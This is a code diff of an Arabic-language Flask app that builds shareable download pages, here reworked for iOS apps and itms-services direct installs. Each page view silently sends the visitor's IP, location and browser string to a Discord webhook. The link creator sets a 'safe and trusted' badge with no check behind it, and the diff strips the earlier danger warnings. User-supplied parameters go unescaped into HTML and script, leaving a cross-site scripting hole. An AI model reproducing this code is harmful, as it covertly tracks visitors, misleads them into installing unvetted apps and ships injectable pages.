@@ -18,7 +18,7 @@ HTML_LAYOUT = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ title if title else 'مركز مشاركة الملفات الاحترافي' }}</title>
+    <title>{{ title if title else 'مركز مشاركة التطبيقات والملفات' }}</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
@@ -111,10 +111,10 @@ def send_visitor_webhook(file_name, user_ip, user_agent):
         pass
 
     embed = {
-        "title": "📥 زائر جديد لصفحة تحميل ملف!",
+        "title": "📥 زائر جديد لصفحة تحميل التطبيق!",
         "color": 5814783,
         "fields": [
-            {"name": "📄 اسم الملف", "value": f"`{file_name}`", "inline": False},
+            {"name": "📱 اسم التطبيق", "value": f"`{file_name}`", "inline": False},
             {"name": "🌍 الدولة والمدينة", "value": f"{country} - {city}", "inline": True},
             {"name": "🌐 IP الزائر", "value": f"`{user_ip}`", "inline": True},
             {"name": "📱 الجهاز ومتصفح الزائر", "value": f"```{user_agent[:150]}```", "inline": False}
@@ -133,21 +133,19 @@ def home():
     if request.method == 'POST':
         recaptcha_response = request.form.get('g-recaptcha-response')
         custom_name = request.form.get('file_name')
-        mediafire_url = request.form.get('mediafire_url')
-        file_status = request.form.get('file_status', 'warning')
-        file_size = request.form.get('file_size', '')
-        file_desc = request.form.get('file_desc', '')
-        timer_sec = request.form.get('timer_sec', '3')
+        download_url = request.form.get('download_url')
+        app_icon = request.form.get('app_icon', '')
+        file_status = request.form.get('file_status', 'safe')
+        timer_sec = request.form.get('timer_sec', '0')
 
         if not verify_recaptcha(recaptcha_response):
             error_msg = "⚠️ يرجى تأكيد أنك لست برنامج روبوت!"
-        elif mediafire_url and custom_name:
+        elif download_url and custom_name:
             params = {
                 'name': custom_name,
-                'url': mediafire_url,
+                'url': download_url,
+                'icon': app_icon,
                 'status': file_status,
-                'size': file_size,
-                'desc': file_desc,
                 'timer': timer_sec
             }
             query_str = urllib.parse.urlencode(params)
@@ -155,8 +153,8 @@ def home():
             
             content = f"""
             <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl border border-emerald-500/30">✓</div>
-            <h1 class="text-2xl font-black text-white mb-2">تم تجهيز رابط الصفحة!</h1>
-            <p class="text-xs text-slate-400 mb-6">اسم الملف: <span class="text-indigo-300 font-bold">{custom_name}</span></p>
+            <h1 class="text-2xl font-black text-white mb-2">تم تجهيز رابط التطبيق!</h1>
+            <p class="text-xs text-slate-400 mb-6">اسم التطبيق: <span class="text-indigo-300 font-bold">{custom_name}</span></p>
             
             <div class="bg-slate-950/80 p-3.5 rounded-2xl border border-slate-800 mb-4 overflow-x-auto">
                 <input type="text" value="{share_link}" readonly id="linkInput" class="w-full bg-transparent text-xs text-center text-indigo-300 font-mono outline-none select-all whitespace-nowrap">
@@ -166,7 +164,7 @@ def home():
                 📋 نسخ رابط المشاركة
             </button>
             
-            <a href="/" class="block text-xs text-slate-400 hover:text-slate-200 transition-colors mt-2">إنشاء رابط لملف آخر</a>
+            <a href="/" class="block text-xs text-slate-400 hover:text-slate-200 transition-colors mt-2">إنشاء رابط لتطبيق آخر</a>
             """
             return render_template_string(HTML_LAYOUT, content=content, title="تم تجهيز الرابط")
         else:
@@ -175,58 +173,40 @@ def home():
     error_html = f'<div class="p-3 mb-4 text-xs text-red-400 bg-red-500/10 border border-red-500/30 rounded-xl">{error_msg}</div>' if error_msg else ''
 
     content = f"""
-    <div class="w-14 h-14 bg-indigo-500/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-indigo-500/30 text-2xl">⚙️</div>
-    <h1 class="text-xl font-black text-white mb-1">لوحة إنشاء رابط المشاركة</h1>
-    <p class="text-slate-400 text-xs mb-6">خصص خيارات التحذير وتفاصيل الملف بسهولة</p>
+    <div class="w-14 h-14 bg-indigo-500/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-indigo-500/30 text-2xl">📱</div>
+    <h1 class="text-xl font-black text-white mb-1">لوحة إنشاء رابط التطبيقات</h1>
+    <p class="text-slate-400 text-xs mb-6">تدعم روابط itms-services وتثبيت iOS المباشر</p>
     
     {error_html}
-
-    <!-- 📊 شريط التحميل والفحص -->
-    <div id="scanProgressContainer" class="hidden mb-6 p-4 bg-slate-950/80 border border-indigo-500/30 rounded-2xl text-right">
-        <div class="flex justify-between items-center mb-2">
-            <span id="scanStatusText" class="text-xs font-bold text-indigo-400 animate-pulse">جاري تجهيز الرابط...</span>
-            <span id="scanPercent" class="text-xs font-black text-indigo-300">0%</span>
-        </div>
-        <div class="w-full bg-slate-800 rounded-full h-3 overflow-hidden p-0.5 border border-slate-700">
-            <div id="progressBar" class="bg-gradient-to-r from-indigo-500 via-purple-500 to-emerald-400 h-full rounded-full transition-all duration-300 animate-stripes w-0"></div>
-        </div>
-    </div>
 
     <form id="uploadForm" method="POST" class="space-y-4 text-right">
 
         <div>
-            <label class="block text-xs font-bold text-slate-300 mb-1">اسم الملف للعرض في الصفحة:</label>
-            <input type="text" name="file_name" placeholder="مثال: تطبيق_الهاتف.apk" required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
+            <label class="block text-xs font-bold text-slate-300 mb-1">اسم التطبيق:</label>
+            <input type="text" name="file_name" placeholder="مثال: Delta iOS" required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
         </div>
         
         <div>
-            <label class="block text-xs font-bold text-slate-300 mb-1">رابط ميديا فاير (MediaFire):</label>
-            <input type="url" name="mediafire_url" placeholder="https://www.mediafire.com/file/..." required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all text-left" dir="ltr">
+            <label class="block text-xs font-bold text-slate-300 mb-1">رابط التحميل المباشر أو itms-services:</label>
+            <input type="text" name="download_url" placeholder="itms-services://?action=download-manifest&url=..." required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all text-left" dir="ltr">
+        </div>
+
+        <div>
+            <label class="block text-xs font-bold text-slate-300 mb-1">رابط صورة/أيقونة التطبيق (اختياري):</label>
+            <input type="url" name="app_icon" placeholder="https://example.com/icon.png" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all text-left" dir="ltr">
         </div>
 
         <div class="grid grid-cols-2 gap-3">
             <div>
-                <label class="block text-xs font-bold text-slate-300 mb-1">حالة وأمان الملف:</label>
+                <label class="block text-xs font-bold text-slate-300 mb-1">حالة التطبيق:</label>
                 <select name="file_status" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white focus:border-indigo-500 outline-none text-xs transition-all">
-                    <option value="safe">🟢 آمن ومفحوص (بدون تحذير)</option>
-                    <option value="warning" selected>⚠️️ تحت الاشتباه (تنبيه برتقالي)</option>
-                    <option value="danger">🚨 غير آمن / خطر (تحذير أحمر)</option>
+                    <option value="safe" selected>🟢 آمن وموثوق</option>
+                    <option value="warning">⚠️ يحتاج تثبيت شهادة</option>
                 </select>
             </div>
             <div>
-                <label class="block text-xs font-bold text-slate-300 mb-1">حجم الملف (اختياري):</label>
-                <input type="text" name="file_size" placeholder="مثال: 45 MB" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
-            </div>
-        </div>
-
-        <div class="grid grid-cols-2 gap-3">
-            <div>
-                <label class="block text-xs font-bold text-slate-300 mb-1">وقت انتظار الزر (ثوانٍ):</label>
-                <input type="number" name="timer_sec" min="0" max="10" value="3" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white focus:border-indigo-500 outline-none text-xs transition-all">
-            </div>
-            <div>
-                <label class="block text-xs font-bold text-slate-300 mb-1">وصف الملف (اختياري):</label>
-                <input type="text" name="file_desc" placeholder="ملاحظات للزائر..." class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
+                <label class="block text-xs font-bold text-slate-300 mb-1">المؤقت (ثوانٍ):</label>
+                <input type="number" name="timer_sec" min="0" max="10" value="0" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white focus:border-indigo-500 outline-none text-xs transition-all">
             </div>
         </div>
 
@@ -234,187 +214,69 @@ def home():
             <div class="g-recaptcha" data-sitekey="{RECAPTCHA_SITE_KEY}" data-theme="dark"></div>
         </div>
 
-        <button type="submit" id="submitBtn" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2">
+        <button type="submit" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2">
             <span>🚀 إنشاء ونشر الرابط</span>
         </button>
     </form>
-
-    <script>
-    document.getElementById('uploadForm').addEventListener('submit', function(e) {{
-        e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        const progressContainer = document.getElementById('scanProgressContainer');
-        const progressBar = document.getElementById('progressBar');
-        const scanStatusText = document.getElementById('scanStatusText');
-        const scanPercent = document.getElementById('scanPercent');
-
-        btn.disabled = true;
-        btn.classList.add('opacity-50');
-        progressContainer.classList.remove('hidden');
-
-        let percent = 0;
-        const steps = [
-            {{ p: 30, t: "🔍 إعداد الخيارات وتشفير الرابط..." }},
-            {{ p: 70, t: "⚡ تهيئة صفحة التحميل ونظام التنبيه..." }},
-            {{ p: 100, t: "✨ كُمل الإنشاء بنجاح!" }}
-        ];
-
-        let stepIndex = 0;
-        const interval = setInterval(() => {{
-            if (stepIndex < steps.length) {{
-                percent = steps[stepIndex].p;
-                scanStatusText.innerText = steps[stepIndex].t;
-                scanPercent.innerText = percent + "%";
-                progressBar.style.width = percent + "%";
-                stepIndex++;
-            }} else {{
-                clearInterval(interval);
-                setTimeout(() => {{
-                    document.getElementById('uploadForm').submit();
-                }}, 400);
-            }}
-        }}, 600);
-    }});
-    </script>
     """
-    return render_template_string(HTML_LAYOUT, content=content, title="لوحة النشر وتجهيز الرابط")
+    return render_template_string(HTML_LAYOUT, content=content, title="إنشاء رابط تطبيق")
 
 @app.route('/download')
 def download():
-    file_name = request.args.get('name', 'ملف للمشاركة')
+    file_name = request.args.get('name', 'تطبيق آيفون')
     file_url = request.args.get('url', '#')
-    file_status = request.args.get('status', 'warning')
-    file_size = request.args.get('size', 'غير محدد')
-    file_desc = request.args.get('desc', '')
-    timer_sec = int(request.args.get('timer', '3'))
+    app_icon = request.args.get('icon', '')
+    timer_sec = int(request.args.get('timer', '0'))
 
-    # إرسال بيانات الزائر للديسكورد عبر الـ Webhook
+    # إرسال بيانات الزائر للديسكورد
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if user_ip and ',' in user_ip:
         user_ip = user_ip.split(',')[0].strip()
     user_agent = request.headers.get('User-Agent', 'غير معروف')
     send_visitor_webhook(file_name, user_ip, user_agent)
 
-    # إعداد بطاقة التنبيه بناءً على الخيار المحدد
-    if file_status == 'safe':
-        status_badge = '<strong class="text-emerald-400">🟢 آمن ومفحوص</strong>'
-        warning_banner = """
-        <div class="mb-5 p-4 bg-emerald-500/10 border border-emerald-500/30 rounded-2xl text-right">
-            <div class="flex items-center gap-2 mb-1">
-                <span class="text-emerald-400 text-lg">✓</span>
-                <h3 class="text-xs font-bold text-emerald-300">ملف مفحوص وآمن:</h3>
-            </div>
-            <p class="text-[11px] text-emerald-200/80 leading-relaxed">
-                تم التحقق من سلامة الملف، ويمكنك تحميله الآن مباشرة بأمان.
-            </p>
-        </div>
-        """
-    elif file_status == 'danger':
-        status_badge = '<strong class="text-red-400">🚨 غير آمن / خطر</strong>'
-        warning_banner = """
-        <div class="mb-5 p-4 bg-red-500/10 border border-red-500/30 rounded-2xl text-right">
-            <div class="flex items-center gap-2 mb-1">
-                <span class="text-red-400 text-lg">🚨</span>
-                <h3 class="text-xs font-bold text-red-300">تحذير أمني عالي الخطورة:</h3>
-            </div>
-            <p class="text-[11px] text-red-200/80 leading-relaxed">
-                هذا الملف يحمل مؤشرات خطر عالية أو يحتوي على برمجيات مشبوهة. التنزيل والتثبيت على مسؤوليتك الخاصة!
-            </p>
-        </div>
-        """
-    else:  # warning
-        status_badge = '<strong class="text-amber-400">⚠️ تحت الاشتباه</strong>'
-        warning_banner = """
-        <div class="mb-5 p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-right">
-            <div class="flex items-center gap-2 mb-1">
-                <span class="text-amber-400 text-lg">⚠️</span>
-                <h3 class="text-xs font-bold text-amber-300">تنبيه وأمان الحماية:</h3>
-            </div>
-            <p class="text-[11px] text-amber-200/80 leading-relaxed">
-                قد يشتبه النظام بوجود ضرر في الملف أو عدم التأكد من مصدره 100%. نوصي بفحصه عبر برنامج الحماية الخاص بك.
-            </p>
-        </div>
-        """
-
-    desc_html = f'<div class="mb-4 p-3 bg-slate-900/80 border border-slate-800 rounded-xl text-right text-xs text-slate-300"><span class="text-indigo-400 font-bold block mb-1">📝 وصف الملف:</span>{file_desc}</div>' if file_desc else ''
+    # الأيقونة الافتراضية في حال عدم رفع صورة
+    default_icon = "https://cdn-icons-png.flaticon.com/512/2583/2583208.png"
+    icon_src = app_icon if app_icon else default_icon
 
     content = f"""
-    {warning_banner}
-
-    <!-- 📦 تفاصيل الملف -->
-    <div class="p-4 bg-slate-950/60 rounded-2xl border border-slate-800 text-right mb-4">
-        <div class="text-[11px] text-slate-400 mb-1">الملف المطلوب:</div>
-        <div class="text-sm font-bold text-indigo-300 truncate font-mono">{file_name}</div>
-        <div class="mt-2 text-[10px] text-slate-500 flex justify-between items-center border-t border-slate-800/60 pt-2">
-            <span>الحالة: {status_badge}</span>
-            <span>الحجم: <strong class="text-slate-300">{file_size if file_size else 'غير محدد'}</strong></span>
+    <!-- 📱 كرت عرض التطبيق والصورة -->
+    <div class="p-6 bg-slate-950/60 rounded-3xl border border-slate-800 text-center mb-6 flex flex-col items-center">
+        <div class="w-24 h-24 mb-4 rounded-2xl overflow-hidden shadow-xl border border-slate-700/60 bg-slate-900 p-1">
+            <img src="{icon_src}" alt="{file_name}" class="w-full h-full object-cover rounded-xl" onerror="this.src='{default_icon}'">
         </div>
+        <h2 class="text-lg font-black text-white mb-1">{file_name}</h2>
+        <span class="inline-block px-3 py-1 bg-indigo-500/10 border border-indigo-500/30 text-indigo-400 rounded-full text-[10px] font-bold">
+            تثبيت مباشر (iOS / iPhone)
+        </span>
     </div>
 
-    {desc_html}
-
-    <!-- ⏳ زر التحميل -->
-    <button id="downloadBtn" {'disabled' if timer_sec > 0 else ''} onclick="handleDownload()" class="glow-button w-full {'bg-slate-800 text-slate-400 cursor-not-allowed' if timer_sec > 0 else 'bg-indigo-600 hover:bg-indigo-500 text-white cursor-pointer'} font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2">
-        <span id="btnText">{'📥 تنزيل الملف الآن' if timer_sec == 0 else f'⏳ انتظر {timer_sec} ثوانٍ لتفعيل الزر...'}</span>
-    </button>
-
-    <!-- 🚨 النافذة المنبثقة للتحذير (تظهر في حالة الاشتباه والخطر فقط) -->
-    <div id="warningModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4 text-right">
-        <div class="glass-panel max-w-sm w-full rounded-2xl p-6 border border-red-500/30 relative">
-            <div class="w-12 h-12 bg-red-500/20 text-red-400 rounded-full flex items-center justify-center mx-auto mb-3 text-2xl border border-red-500/30">
-                🚨
-            </div>
-            <h3 class="text-base font-bold text-white text-center mb-2">تأكيد التنزيل على مسؤوليتك</h3>
-            <p class="text-xs text-slate-300 leading-relaxed mb-6">
-                هذا تحذير أخير: الملف قد يحتوي على برمجيات غير معروفة أو يشار إليها كاشتباه. هل تريد المتابعة وتنزيل الملف على أي حال؟
-            </p>
-            <div class="flex gap-3">
-                <a href="{file_url}" target="_blank" onclick="closeModal()" class="w-1/2 bg-red-600 hover:bg-red-500 text-white font-bold py-2.5 rounded-xl text-xs text-center transition-all shadow-lg shadow-red-600/30">
-                    نعم، تنزيل الملف
-                </a>
-                <button onclick="closeModal()" class="w-1/2 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-2.5 rounded-xl text-xs transition-all">
-                    إلغاء
-                </button>
-            </div>
-        </div>
-    </div>
+    <!-- 📥 زر التحميل والتثبيت المباشر -->
+    <a id="downloadBtn" href="{file_url}" class="glow-button block w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-4 rounded-xl transition-all text-sm text-center">
+        <span id="btnText">📲 تنزيل وتثبيت التطبيق الآن</span>
+    </a>
 
     <script>
     let timeLeft = {timer_sec};
-    const fileStatus = "{file_status}";
-    const fileUrl = "{file_url}";
     const btn = document.getElementById('downloadBtn');
     const btnText = document.getElementById('btnText');
 
     if (timeLeft > 0) {{
+        btn.classList.add('pointer-events-none', 'opacity-50');
         const countdown = setInterval(() => {{
             timeLeft--;
             if (timeLeft > 0) {{
-                btnText.innerText = "⏳ انتظر " + timeLeft + " ثوانٍ لتفعيل الزر...";
+                btnText.innerText = "⏳ انتظر " + timeLeft + " ثوانٍ لتفعيل التنزيل...";
             }} else {{
                 clearInterval(countdown);
-                btn.disabled = false;
-                btn.classList.remove('bg-slate-800', 'text-slate-400', 'cursor-not-allowed');
-                btn.classList.add('bg-indigo-600', 'hover:bg-indigo-500', 'text-white', 'cursor-pointer');
-                btnText.innerText = "📥 تنزيل الملف الآن";
+                btn.classList.remove('pointer-events-none', 'opacity-50');
+                btnText.innerText = "📲 تنزيل وتثبيت التطبيق الآن";
             }}
         }}, 1000);
     }}
-
-    function handleDownload() {{
-        if (fileStatus === 'safe') {{
-            window.open(fileUrl, '_blank');
-        }} else {{
-            document.getElementById('warningModal').classList.remove('hidden');
-        }}
-    }}
-
-    function closeModal() {{
-        document.getElementById('warningModal').classList.add('hidden');
-    }}
     </script>
     """
-    return render_template_string(HTML_LAYOUT, content=content, title=f"تحميل {file_name}")
+    return render_template_string(HTML_LAYOUT, content=content, title=f"تثبيت {file_name}")
 
 if __name__ == '__main__':
     app.run(debug=True)
